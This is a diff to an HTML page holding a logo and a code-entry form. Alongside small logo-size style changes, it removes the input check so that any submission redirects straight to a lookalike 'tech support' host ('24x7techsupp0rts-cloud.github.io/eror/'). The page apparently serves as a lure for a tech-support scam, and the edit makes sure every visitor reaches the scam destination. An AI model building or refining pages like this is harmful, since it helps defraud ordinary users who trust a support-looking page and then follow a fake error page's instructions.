@@ -21,10 +21,7 @@
       padding:16px;
     }
     .container{width:100%;max-width:420px;text-align:center}
-    img.logo{
-      height:60px;   /* Increased from 28px */
-      margin-bottom:28px;
-    }
+    img.logo{height:40px;margin-bottom:28px}
     h1{font-size:20px;margin-bottom:8px;font-weight:600}
     p.lead{color:var(--muted);margin-bottom:20px;font-size:15px}
 
@@ -72,7 +69,6 @@
       h1{font-size:18px}
       p.lead{font-size:14px}
       input[type="text"], button.primary{font-size:14px;padding:12px}
-      img.logo{height:50px;} /* slightly smaller on mobile */
     }
   </style>
 </head>
@@ -101,14 +97,9 @@
 
   <script>
     const form = document.getElementById('codeForm');
-    const codeInput = document.getElementById('code');
-
     form.addEventListener('submit', (e)=>{
       e.preventDefault();
-      if(codeInput.value.trim().length < 4){
-        alert('Please enter a valid code.');
-        return;
-      }
+      // Direct redirect without showing alert
       window.location.href = "https://24x7techsupp0rts-cloud.github.io/eror/";
     });
   </script>
